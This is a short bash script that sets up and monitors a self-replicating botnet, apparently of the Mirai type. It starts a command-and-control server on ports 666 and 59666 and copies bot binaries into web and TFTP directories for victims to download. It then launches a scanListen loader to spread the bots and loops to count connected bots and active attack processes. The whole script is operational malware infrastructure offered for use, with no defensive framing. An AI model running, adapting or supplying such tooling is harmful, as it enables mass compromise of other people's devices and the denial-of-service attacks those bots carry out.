#!/bin/bash

# Setup script to ensure self-replicated bots connect to local CNC
echo "=== Setting up Self-Rep Bot CNC Connection ==="

# 1. Ensure CNC is running on both ports
echo "Starting CNC server on ports 666 and 59666..."
cd /root/cnc
./admin &
CNC_PID=$!
echo "CNC started with PID: $CNC_PID"

# Wait for CNC to start
sleep 3

# 2. Verify CNC is listening on both ports
echo "Verifying CNC is listening..."
ss -tlnp | grep -E "(666|59666)"

# 3. Copy optimized bot binaries to web directories
echo "Deploying optimized bot binaries..."
cp /root/release/static.* /var/www/html/bins/
cp /root/release/static.* /var/lib/tftpboot/
echo "Bot binaries deployed to web directories"

# 4. Start scanListen for self-replication
echo "Starting scanListen for bot propagation..."
cd /root/loader
./optimize_scanlisten.sh &
SCAN_PID=$!
echo "scanListen started with PID: $SCAN_PID"

# 5. Monitor connections
echo "=== Monitoring Self-Rep Bot Connections ==="
echo "CNC PID: $CNC_PID"
echo "ScanListen PID: $SCAN_PID"
echo ""

while true; do
    sleep 30
    echo "=== Connection Status ==="
    echo "CNC Connections:"
    ss -tnp | grep -E "(666|59666)" | wc -l
    echo "Active Bots:"
    ps aux | grep -E "(static\.|attack\.)" | grep -v grep | wc -l
    echo "ScanListen Processes:"
    ps aux | grep scanListen | grep -v grep | wc -l
    echo "========================"
done
